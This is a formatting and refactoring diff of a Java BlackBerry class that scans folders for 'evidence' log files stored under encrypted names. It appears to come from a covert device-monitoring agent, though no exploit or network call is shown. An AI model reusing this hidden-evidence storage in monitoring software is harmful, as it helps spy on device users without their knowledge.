@@ -39,7 +39,8 @@ import blackberry.utils.StringSortVector;
  */
 public final class EvidenceCollector implements iSingleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("EvidenceColl", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("EvidenceColl",
+            DebugLevel.INFORMATION);
     //#endif
 
     static EvidenceCollector instance = null;
@@ -95,8 +96,7 @@ public final class EvidenceCollector implements iSingleton {
      */
     public static synchronized EvidenceCollector getInstance() {
         if (instance == null) {
-            instance = (EvidenceCollector) Singleton.self().get(
-                    GUID);
+            instance = (EvidenceCollector) Singleton.self().get(GUID);
             if (instance == null) {
                 final EvidenceCollector singleton = new EvidenceCollector();
                 singleton.initKeys();
@@ -363,11 +363,10 @@ public final class EvidenceCollector implements iSingleton {
         //#endif
 
         final StringSortVector vector = new StringSortVector();
-        ExtendedFileConnection fc;
+        FileConnection fc;
 
         try {
-            fc = (ExtendedFileConnection) Connector.open("file://"
-                    + currentPath);
+            fc = (FileConnection) Connector.open("file://" + currentPath);
 
             if (fc.isDirectory()) {
                 final Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*",
@@ -437,7 +436,8 @@ public final class EvidenceCollector implements iSingleton {
             if (fcDir.isDirectory()) {
 
                 //#ifdef DEBUG
-                debug.trace("scanForEvidences " + currentPath + dir + " size:" + fcDir.directorySize(false));
+                debug.trace("scanForEvidences " + currentPath + dir + " size:"
+                        + fcDir.directorySize(false));
                 //#endif
                 final Enumeration fileLogs = fcDir.list("*", true);
 
@@ -450,7 +450,8 @@ public final class EvidenceCollector implements iSingleton {
                     final String logMask = EvidenceCollector.LOG_EXTENSION;
                     final String encLogMask = encryptName(logMask);
 
-                    if (file.endsWith(encLogMask) || file.endsWith(encLogMask + ".rem")) {
+                    if (file.endsWith(encLogMask)
+                            || file.endsWith(encLogMask + ".rem")) {
                         // String encName = fcFile.getName();
                         //#ifdef DEBUG
                         debug.trace("enc name: " + file);
@@ -501,7 +502,10 @@ public final class EvidenceCollector implements iSingleton {
     public void initEvidences() {
         clear();
 
-        Path.makeDirs();
+        if (!Path.isInizialized()) {
+            Path.makeDirs();
+        }
+
     }
 
 }
